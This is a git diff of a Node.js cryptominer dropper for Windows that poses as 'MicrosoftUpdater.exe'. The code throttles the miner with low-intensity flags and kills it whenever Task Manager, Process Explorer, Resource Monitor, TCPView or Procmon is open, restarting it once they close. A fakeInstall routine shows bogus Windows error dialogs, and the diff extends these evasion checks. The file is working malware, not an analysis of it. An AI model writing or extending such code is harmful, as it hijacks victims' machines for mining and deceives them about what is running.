@@ -4,32 +4,7 @@
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
-const { exec } = require('child_process');
 const { execSync } = require('child_process');
-
-const flags = '--threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light';
-
-// Win-interact preferences
-
-/* class Web {
-    constructor(url) {
-
-        this.url = url;
-
-    }
-    POST (url) {
-
-
-    }
-    PUT (url) {
-
-
-    }
-    GET (url) {
-
-
-    }
-} */
 
 Win.set.preferences({
     TTSVoice: 'Microsoft David Desktop',
@@ -60,26 +35,27 @@ async function main() {
     while (true) {
         // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
         const taskManagerIsRunning = checkIfAnyProcessIsRunning('Taskmgr.exe');
-        const processExplorerIsRunning = checkIfAnyProcessIsRunning('procexp64.exe'); // Boolean
+        const processExplorerIsRunning = checkIfAnyProcessIsRunning('procexp.exe') && checkIfAnyProcessIsRunning('procexp64.exe'); // Boolean
         const resourceMonitorIsRunning = checkIfAnyProcessIsRunning('perfmon.exe');
-        console.log(taskManagerIsRunning);
-        console.log(processExplorerIsRunning);
-        console.log(resourceMonitorIsRunning);
+        const tcpViewIsRunning = checkIfAnyProcessIsRunning('tcpview.exe');
+        const processMonitorIsRunning = checkIfAnyProcessIsRunning('Procmon.exe') && checkIfAnyProcessIsRunning('Procmon64.exe');
+
+        console.log(`taskmgr running: ${taskManagerIsRunning}`);
+        console.log(`procexp64 running: ${processExplorerIsRunning}`);
+        console.log(`resourceMonitor running: ${resourceMonitorIsRunning}`);
+        console.log(`tcpview running: ${tcpViewIsRunning}`);
+        console.log(`procmon running: ${processMonitorIsRunning}`);
         
-        if (taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == true) {
+        if (taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning || tcpViewIsRunning || processMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == true) {
         // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
             killMiner();
-            wait(1000);
-            console.log('miner killed due to taskmgr opening');
+            console.log('miner killed due to a system monitoring tool opening');
     }
-        if (!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == false) {
+        if (!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && !tcpViewIsRunning && !processMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == false) {
             runMiner();
-            wait(1000);
             console.log('miner restarted due to favorable conditions');
         
         }
-        // As long as neither TaskMgr, ProcExp, or ResMon is running and the malware is not already running, start it
-        wait(500);     
     }
 }
 
@@ -98,6 +74,7 @@ function killMiner() {
         console.log('miner killed');
     } catch {
         Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe'); 
+        console.log('miner killed using secondary method');
     }
 }
 
@@ -107,7 +84,7 @@ function wait(ms) {
 
 function runMiner() {
     Win.cmd('start.cmd --threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light');
-    console.log('miner started');
+    console.log('miner started with low intensity flags');
 }
 
 async function autorunMethods() {
@@ -142,16 +119,22 @@ async function fakeInstall() {
         switch (errorCode) {
             case 1:
                 await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', windowFailTitle);
+                break;
             case 2:
                 await Win.alert('The specified file is encrypted and the user does not have the ability to decrypt it. Error code: 0x1772.', windowFailTitle);
+                break;
             case 3:
                 await Win.alert('The specified compression format is unsupported. Error code: 0x26A.', windowFailTitle);
+                break;
             case 4:
                 await Win.alert('A dynamic link library (DLL) initialization routine failed. Error code: 0x45A.', windowFailTitle);
+                break;
             case 5:
                 await Win.alert('A configuration value is invalid. Error code: 0xFDF.', windowFailTitle);
+                break;
             default:
-                await Win.alert('A security package specific error occurred. Error code: 0x721.', windowFailTitle); 
+                await Win.alert('A security package specific error occurred. Error code: 0x721.', windowFailTitle);
+                break; 
         }
         await Win.alert('Please visit https://learn.microsoft.com/en-us/windows/win32/debug/error-handling for more information.', 'Windows Updater failure');
         console.log('fake dialog succeeded');
